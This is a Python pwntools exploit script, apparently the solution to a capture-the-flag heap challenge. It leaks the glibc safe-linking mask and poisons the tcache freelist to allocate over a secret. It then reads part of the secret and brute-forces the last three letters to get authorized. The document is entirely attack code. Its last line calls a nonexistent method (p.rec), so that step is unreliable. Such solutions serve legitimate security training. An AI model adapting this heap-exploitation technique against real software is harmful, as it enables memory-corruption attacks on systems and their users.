from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/seeking-safe-secrets-hard")
def malloc(idx,size):
    p.sendlineafter("quit):","malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendlineafter("quit):","free "+str(idx))
def scanf(idx,payload):
    p.sendlineafter("quit):","scanf "+str(idx))
    p.sendline(payload)
def echo(idx,l):
    p.sendlineafter("quit):","echo "+str(idx)+" "+str(l))
def qt():
    p.sendlineafter("quit):","quit")
def puts(idx):
    p.sendlineafter("quit):","puts "+str(idx))
def send_flag(secret):
    p.sendlineafter("quit):","send_flag")
    p.sendline(secret)
secret_addr=0x425850
l=100
malloc(2,l)
malloc(0,l)
malloc(1,l)
free(0)
puts(0)
p.recvuntil("Data: ",drop=True)
mask=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[+]Mask:",hex(mask))
free(1)
scanf(1,p64((secret_addr)^mask))
malloc(0,l)
malloc(0,l)
free(2)
puts(2)
p.recvuntil("Data: ",drop=True)
secret=p.recvuntil("\n",drop=True)[:8].ljust(8,b'\x00')
secret=(secret[-5:])[::-1]
print("[+]Secret:",secret)
for x in range(26*26*26):
    i=x//(26*26)
    j=(x%(26*26))//26
    k=x%26
    temp=chr(97+i).encode()+chr(97+j).encode()+chr(97+k).encode()
    payload=(secret+temp)[::-1]+b'\x00'*8
    print("[+]Payload:",payload)
    send_flag(payload)
    a=p.recvline()
    while b"uthorize" not in a:
        a=p.recvline()
    if b"Authorized" in a:
        break
p.recvuntil("pwn")
print(p.rec())
